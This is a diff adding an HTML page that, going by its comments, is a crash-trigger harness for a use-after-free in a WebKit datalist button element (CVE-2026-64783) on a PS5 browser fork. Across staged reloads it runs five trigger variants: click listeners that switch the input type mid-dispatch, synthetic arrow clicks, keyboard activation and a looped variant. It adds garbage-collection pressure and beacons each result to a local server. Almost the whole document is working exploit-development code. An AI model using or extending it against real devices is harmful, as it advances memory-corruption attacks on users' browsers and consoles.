@@ -1,0 +1,219 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1174 Datalist Button UAF (CVE-2026-64783)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1174 — DATALIST BUTTON UAF (CVE-2026-64783)</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">stage: ?</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1174-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1174: CVE-2026-64783 — DataListButtonElement UAF (bug 313521, fixed
+   2026-08-12 upstream — NOT in PS5 fork unless backported).
+   Bug: DataListButtonElement holds raw DataListButtonOwner& (the owner =
+   TextFieldInputType). Changing input.type inside a click listener frees
+   TextFieldInputType mid-dispatch; the datalist button's
+   defaultEventHandler then virtual-calls the freed owner.
+   Upstream trigger needs internals/UIHelper (absent on PS5). Variants:
+   0: feature detect (datalist + list attr support)
+   1: bubble-phase click listener (upstream shape) + input.click()
+   2: capture-phase listener (fires before shadow default handler) + click()
+   3: synthetic MouseEvent at the arrow coords (composed+bubbles)
+   4: focus + keydown/up Space/Enter
+   5: variant-2 looped 50x with fresh inputs each iter
+   Crash = WebProcess death (stage advance). Survival = variant inert.
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var STAGES=['detect','vA-bubble','vB-capture','vC-arrowclick','vD-keyboard','vE-loop'];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1174_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1174_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/5 — '+STAGES[stage]);
+setCounters('prev: '+JSON.stringify(results).slice(0,400));
+
+if(stage>=STAGES.length){
+  setStatus('ALL DONE');
+  B('ALL-DONE',JSON.stringify(results).slice(0,800));
+  log('=== ALL DONE ===','ok');
+  try{localStorage.removeItem('p1174_stage');}catch(e){}
+}else{
+
+try{localStorage.setItem('p1174_stage',''+(stage+1));}catch(e){}
+var cur=STAGES[stage];
+
+function mkInput(){
+  var inp=document.createElement('input');
+  inp.type='text';
+  inp.style.width='300px';
+  inp.style.height='50px';
+  inp.setAttribute('list','dl');
+  document.body.appendChild(inp);
+  return inp;
+}
+function mkList(){
+  var dl=document.getElementById('dl');
+  if(!dl){
+    dl=document.createElement('datalist');
+    dl.id='dl';
+    dl.innerHTML='<option value="a"><option value="b">';
+    document.body.appendChild(dl);
+  }
+  return dl;
+}
+function gcPressure(){
+  for(var g=0;g<2000;g++){var t=new ArrayBuffer(64);t=null;}
+}
+function done(rep,extra){
+  results.push({stage:stage,name:cur,result:rep,extra:extra||''});
+  try{localStorage.setItem('p1174_res',JSON.stringify(results));}catch(e){}
+  B('RESULT',rep.slice(0,700));
+  addFind(cur+': '+rep);
+  setStatus(rep);
+  log('=== '+cur+' -> '+rep+' ===','ok');
+  B('NEXT');
+  setTimeout(function(){location.reload(true);},800);
+}
+
+if(cur==='detect'){
+  var hasDatalist=(typeof HTMLDataListElement!=='undefined');
+  var hasListAttr=('list' in HTMLInputElement.prototype);
+  var inp=mkInput();mkList();
+  var listVal='';
+  try{listVal=inp.list?inp.list.id:'null';}catch(e){listVal='ERR';}
+  done('datalist='+hasDatalist+'|listAttr='+hasListAttr+'|inp.list='+listVal);
+}else if(cur==='vA-bubble'){
+  setPhase('bubble listener + click()');
+  var i=mkInput();mkList();
+  i.addEventListener('click',function(e){
+    B('CLICK-LISTENER','fired');
+    i.type='button';
+    gcPressure();
+  },{once:true});
+  B('CLICKING','vA');
+  i.click();
+  setTimeout(function(){done('SURVIVED-A|type='+i.type);},600);
+}else if(cur==='vB-capture'){
+  setPhase('capture listener + click()');
+  var i2=mkInput();mkList();
+  i2.addEventListener('click',function(e){
+    B('CAPTURE-FIRED','vB');
+    i2.type='button';
+    gcPressure();
+  },{capture:true,once:true});
+  B('CLICKING','vB');
+  i2.click();
+  setTimeout(function(){done('SURVIVED-B|type='+i2.type);},600);
+}else if(cur==='vC-arrowclick'){
+  setPhase('synthetic click at arrow coords');
+  var i3=mkInput();mkList();
+  i3.addEventListener('click',function(e){
+    B('ARROW-CAPTURE','vC');
+    i3.type='button';
+    gcPressure();
+  },{capture:true,once:true});
+  setTimeout(function(){
+    var rect=i3.getBoundingClientRect();
+    var ev=new MouseEvent('click',{bubbles:true,composed:true,cancelable:true,
+      clientX:rect.right-12,clientY:rect.top+rect.height/2});
+    B('ARROW-DISPATCH','x='+(rect.right-12)+'|y='+(rect.top+rect.height/2));
+    i3.dispatchEvent(ev);
+    setTimeout(function(){done('SURVIVED-C|type='+i3.type);},600);
+  },300);
+}else if(cur==='vD-keyboard'){
+  setPhase('keyboard activation');
+  var i4=mkInput();mkList();
+  i4.addEventListener('click',function(e){
+    B('KB-CLICK','vD');
+    i4.type='button';
+    gcPressure();
+  },{once:true});
+  setTimeout(function(){
+    i4.focus();
+    var kd=new KeyboardEvent('keydown',{key:' ',bubbles:true,cancelable:true});
+    i4.dispatchEvent(kd);
+    var ku=new KeyboardEvent('keyup',{key:' ',bubbles:true,cancelable:true});
+    i4.dispatchEvent(ku);
+    setTimeout(function(){
+      var ke=new KeyboardEvent('keydown',{key:'Enter',bubbles:true,cancelable:true});
+      i4.dispatchEvent(ke);
+      setTimeout(function(){done('SURVIVED-D|type='+i4.type);},600);
+    },100);
+  },300);
+}else if(cur==='vE-loop'){
+  setPhase('capture variant looped 50x');
+  var n=0;
+  function iter(){
+    if(n>=50){done('SURVIVED-E-50x');return;}
+    n++;
+    var el=document.createElement('input');
+    el.type='text';
+    el.style.cssText='width:300px;height:50px;display:none';
+    el.setAttribute('list','dl');
+    document.body.appendChild(el);
+    el.addEventListener('click',function(e){
+      el.type='button';
+      gcPressure();
+    },{capture:true,once:true});
+    el.click();
+    setTimeout(iter,40);
+  }
+  B('LOOP-START','vE');
+  iter();
+  setTimeout(function(){done('SURVIVED-E-timeout|n='+n);},5000);
+}
+
+} /* stage machine */
+
+/* auto-reload checker */
+(function(){
+  var cur='P1174-datalist-uaf';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
